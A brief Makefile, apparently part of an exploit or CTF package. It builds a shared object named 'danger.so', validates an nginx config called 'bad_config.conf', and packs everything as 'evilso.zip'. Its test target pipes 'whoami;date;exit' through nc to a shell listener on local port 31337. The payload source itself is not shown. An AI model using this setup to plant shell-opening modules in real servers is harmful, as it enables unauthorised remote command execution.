
build:
	gcc -fPIC -nostdlib -ffreestanding -fno-builtin -o danger.so danger.c -shared
	readelf -a ./danger.so

test: 
	nginx -t -c /root/so/bad_config.conf; echo "whoami;date; exit\n" |nc 127.0.0.1 31337

pack:
	zip -r evilso.zip ./danger.c ./danger.so ./bad_config.conf ./Makefile 